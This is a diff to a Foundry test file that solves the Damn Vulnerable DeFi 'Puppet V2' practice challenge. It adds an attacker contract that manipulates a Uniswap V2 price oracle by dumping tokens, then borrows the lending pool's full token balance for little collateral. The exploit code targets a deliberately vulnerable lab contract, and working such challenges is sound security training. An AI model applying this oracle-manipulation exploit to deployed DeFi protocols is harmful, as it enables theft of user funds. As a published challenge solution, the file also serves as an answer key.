@@ -119,6 +119,13 @@ contract PuppetV2 is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        vm.startPrank(attacker);
+        PuppetV2Attacker puppetAttacker = new PuppetV2Attacker();
+        payable(address(puppetAttacker)).transfer(ATTACKER_INITIAL_ETH_BALANCE);
+        dvt.transfer(address(puppetAttacker), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        puppetAttacker.attack(weth, dvt, uniswapV2Router, puppetV2Pool);
+
         /** EXPLOIT END **/
         validation();
     }
@@ -130,4 +137,37 @@ contract PuppetV2 is Test {
         assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
         assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
     }
+}
+
+contract PuppetV2Attacker {
+    function attack(
+        WETH9 weth,
+        DamnValuableToken dvt,
+        IUniswapV2Router02 router,
+        PuppetV2Pool pool
+    ) external {
+        dvt.approve(address(router), 10_000e18);
+
+        address[] memory path = new address[](2);
+
+        path[0] = address(dvt);
+        path[1] = address(weth);
+
+        router.swapExactTokensForTokens(
+            10_000e18,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+
+        weth.deposit{value: 20e18}();
+        weth.approve(address(pool), 30e18);
+
+        pool.borrow(1_000_000e18);
+
+        dvt.transfer(msg.sender, 1_000_000e18);
+    }
+
+    receive() external payable {}
 }
